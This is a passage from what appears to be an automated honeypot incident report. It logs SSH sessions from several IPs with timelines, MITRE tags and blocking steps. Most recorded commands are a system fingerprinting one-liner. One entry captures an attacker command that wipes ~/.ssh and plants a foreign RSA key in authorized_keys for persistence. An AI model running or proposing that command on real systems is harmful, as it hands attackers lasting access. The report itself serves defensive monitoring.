- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a04907d5e2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:25 |
| **Last Seen** | 2026-07-05 05:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:25:54` | `cowrie.session.connect` |
| `2026-07-05 05:25:55` | `cowrie.client.version` |
| `2026-07-05 05:25:55` | `cowrie.client.kex` |
| `2026-07-05 05:25:58` | `cowrie.login.success` |
| `2026-07-05 05:26:00` | `cowrie.session.params` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.success` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:00` | `cowrie.command.input` |
| `2026-07-05 05:26:01` | `cowrie.log.closed` |
| `2026-07-05 05:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-640b82900ca0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 05:27 |
| **Last Seen** | 2026-07-05 05:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:27:07` | `cowrie.session.connect` |
| `2026-07-05 05:27:08` | `cowrie.client.version` |
| `2026-07-05 05:27:08` | `cowrie.client.kex` |
| `2026-07-05 05:27:15` | `cowrie.login.success` |
| `2026-07-05 05:27:18` | `cowrie.session.params` |
| `2026-07-05 05:27:18` | `cowrie.command.input` |
| `2026-07-05 05:27:20` | `cowrie.log.closed` |
| `2026-07-05 05:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5d3822787b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:27 |
| **Last Seen** | 2026-07-05 05:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:27:09` | `cowrie.session.connect` |
| `2026-07-05 05:27:10` | `cowrie.client.version` |
| `2026-07-05 05:27:10` | `cowrie.client.kex` |
| `2026-07-05 05:27:14` | `cowrie.login.success` |
| `2026-07-05 05:27:16` | `cowrie.session.params` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.success` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:16` | `cowrie.command.input` |
| `2026-07-05 05:27:19` | `cowrie.log.closed` |
| `2026-07-05 05:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb8eae5d832f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:27 |
| **Last Seen** | 2026-07-05 05:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:27:27` | `cowrie.session.connect` |
| `2026-07-05 05:27:28` | `cowrie.client.version` |
| `2026-07-05 05:27:28` | `cowrie.client.kex` |
| `2026-07-05 05:27:32` | `cowrie.login.success` |
| `2026-07-05 05:27:35` | `cowrie.session.params` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.success` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:35` | `cowrie.command.input` |
| `2026-07-05 05:27:36` | `cowrie.log.closed` |
| `2026-07-05 05:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8525fb8a9e83

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:28 |
| **Last Seen** | 2026-07-05 05:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:28:34` | `cowrie.session.connect` |
| `2026-07-05 05:28:35` | `cowrie.client.version` |
| `2026-07-05 05:28:35` | `cowrie.client.kex` |
| `2026-07-05 05:28:38` | `cowrie.login.success` |
| `2026-07-05 05:28:41` | `cowrie.session.params` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.success` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:41` | `cowrie.command.input` |
| `2026-07-05 05:28:43` | `cowrie.log.closed` |
| `2026-07-05 05:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98c9e903de0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:29 |
| **Last Seen** | 2026-07-05 05:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:29:07` | `cowrie.session.connect` |
| `2026-07-05 05:29:08` | `cowrie.client.version` |
| `2026-07-05 05:29:08` | `cowrie.client.kex` |
| `2026-07-05 05:29:13` | `cowrie.login.success` |
| `2026-07-05 05:29:16` | `cowrie.session.params` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.success` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:16` | `cowrie.command.input` |
| `2026-07-05 05:29:17` | `cowrie.log.closed` |
| `2026-07-05 05:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298b90af0a48

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:29 |
| **Last Seen** | 2026-07-05 05:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:29:56` | `cowrie.session.connect` |
| `2026-07-05 05:29:57` | `cowrie.client.version` |
| `2026-07-05 05:29:57` | `cowrie.client.kex` |
| `2026-07-05 05:30:01` | `cowrie.login.success` |
| `2026-07-05 05:30:05` | `cowrie.session.params` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.success` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:05` | `cowrie.command.input` |
| `2026-07-05 05:30:06` | `cowrie.log.closed` |
| `2026-07-05 05:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc44525926d6

| Field | Detail |
|---|---|
| **Source IP** | `43.142.255[.]221` |
| **First Seen** | 2026-07-05 05:30 |
| **Last Seen** | 2026-07-05 05:35 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:30:14` | `cowrie.session.connect` |
| `2026-07-05 05:30:15` | `cowrie.client.version` |
| `2026-07-05 05:30:15` | `cowrie.client.kex` |
| `2026-07-05 05:30:16` | `cowrie.login.success` |
| `2026-07-05 05:30:17` | `cowrie.session.params` |
| `2026-07-05 05:30:17` | `cowrie.command.input` |
| `2026-07-05 05:30:17` | `cowrie.command.failed` |
| `2026-07-05 05:30:18` | `cowrie.log.closed` |
| `2026-07-05 05:30:18` | `cowrie.session.params` |
| `2026-07-05 05:30:18` | `cowrie.command.input` |
| `2026-07-05 05:30:19` | `cowrie.session.file_download` |
| `2026-07-05 05:30:19` | `cowrie.log.closed` |
| `2026-07-05 05:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.142.255[.]221` to AbuseIPDB if not already reported
- [ ] Block `43.142.255[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69b765f6dd1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:30 |
| **Last Seen** | 2026-07-05 05:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:30:43` | `cowrie.session.connect` |
| `2026-07-05 05:30:44` | `cowrie.client.version` |
| `2026-07-05 05:30:44` | `cowrie.client.kex` |
| `2026-07-05 05:30:49` | `cowrie.login.success` |
| `2026-07-05 05:30:51` | `cowrie.session.params` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.success` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:51` | `cowrie.command.input` |
| `2026-07-05 05:30:52` | `cowrie.log.closed` |
| `2026-07-05 05:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd76f3673703

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:31 |
| **Last Seen** | 2026-07-05 05:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:31:19` | `cowrie.session.connect` |
| `2026-07-05 05:31:20` | `cowrie.client.version` |
| `2026-07-05 05:31:20` | `cowrie.client.kex` |
| `2026-07-05 05:31:23` | `cowrie.login.success` |
| `2026-07-05 05:31:25` | `cowrie.session.params` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.success` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:25` | `cowrie.command.input` |
| `2026-07-05 05:31:27` | `cowrie.log.closed` |
| `2026-07-05 05:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5c038fac30

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:32 |
| **Last Seen** | 2026-07-05 05:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:32:12` | `cowrie.session.connect` |
| `2026-07-05 05:32:13` | `cowrie.client.version` |
| `2026-07-05 05:32:13` | `cowrie.client.kex` |
| `2026-07-05 05:32:19` | `cowrie.login.success` |
| `2026-07-05 05:32:23` | `cowrie.session.params` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.success` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:23` | `cowrie.command.input` |
| `2026-07-05 05:32:24` | `cowrie.log.closed` |
| `2026-07-05 05:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f076d669ac9d

| Field | Detail |
|---|---|
| **Source IP** | `79.76.58[.]113` |
| **First Seen** | 2026-07-05 05:32 |
| **Last Seen** | 2026-07-05 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:32:16` | `cowrie.session.connect` |
| `2026-07-05 05:32:18` | `cowrie.telnet.option` |
| `2026-07-05 05:32:19` | `cowrie.telnet.option` |
| `2026-07-05 05:33:19` | `cowrie.login.success` |
| `2026-07-05 05:33:20` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `79.76.58[.]113` to AbuseIPDB if not already reported
- [ ] Block `79.76.58[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b80eaba35a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:32 |
| **Last Seen** | 2026-07-05 05:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:32:42` | `cowrie.session.connect` |
| `2026-07-05 05:32:43` | `cowrie.client.version` |
| `2026-07-05 05:32:43` | `cowrie.client.kex` |
| `2026-07-05 05:32:46` | `cowrie.login.success` |
| `2026-07-05 05:32:48` | `cowrie.session.params` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.success` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:48` | `cowrie.command.input` |
| `2026-07-05 05:32:50` | `cowrie.log.closed` |
| `2026-07-05 05:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79db8e0bc45

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:33 |
| **Last Seen** | 2026-07-05 05:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
